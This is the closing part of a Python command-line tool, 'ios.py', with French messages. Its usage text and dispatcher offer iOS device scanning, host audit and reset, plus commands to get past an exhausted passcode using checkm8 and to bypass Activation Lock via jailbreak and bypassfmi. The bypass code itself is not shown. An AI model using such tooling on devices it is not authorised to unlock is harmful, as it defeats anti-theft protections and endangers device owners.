                    pause(force=True)
                    break
    except KeyboardInterrupt:
        clear()
        out(f"\n{W}  interrompu{R}\n")
        return 130


USAGE = f"""ios.py {VERSION} — détection et maintenance iOS réelles

  ios.py                  menu interactif
  ios.py check            vérifie les dépendances (0 = complet)
  ios.py install          installe les outils manquants
  ios.py scan             détection USB + appareils appairés
  ios.py sys              audit de l'hôte
  ios.py unlock           passcode épuisé (checkm8)
  ios.py lock             verrou d'activation (jailbreak + bypassfmi)
  ios.py reset [action]   restart | shutdown | erase | restore | dfu
  ios.py --yes ...        installe sans demander, sans confirmation
  ios.py --version

Plateforme courante : {OS_LABEL}
"""


def main(argv):
    global ASSUME_YES
    if IS_WIN:
        os.system("")

    if "--yes" in argv[1:] or "-y" in argv[1:]:
        ASSUME_YES = True
    args = [a for a in argv[1:] if a not in ("--yes", "-y")]

    if not args:
        return menu()
    cmd, rest = args[0], args[1:]

    if cmd in ("-h", "--help", "help"):
        print(USAGE)
        return 0
    if cmd in ("-V", "--version", "version"):
        print(f"ios.py {VERSION}")
        return 0
    if cmd == "check":
        return 0 if preflight(True) else 2
    if cmd == "install":
        for tool in CORE_TOOLS + BYPASS_TOOLS:
            if not tool_ok(tool):
                ok(f"{tool} installé") if install_one(tool) else bad(f"échec : {tool}")
        return 0 if not [t for t in CORE_TOOLS + BYPASS_TOOLS if not tool_ok(t)] else 2
    if cmd == "scan":
        return cmd_scan()
    if cmd == "sys":
        return cmd_sys()
    if cmd == "unlock":
        return cmd_unlock()
    if cmd == "lock":
        return cmd_lock()
    if cmd == "reset":
        return cmd_reset(rest[0] if rest else None)

    print(USAGE)
    return 1


if __name__ == "__main__":
    try:
        code = main(sys.argv)
    except KeyboardInterrupt:
        code = 130
    if IS_WIN and len(sys.argv) == 1:
        pause(force=True)
    sys.exit(code)
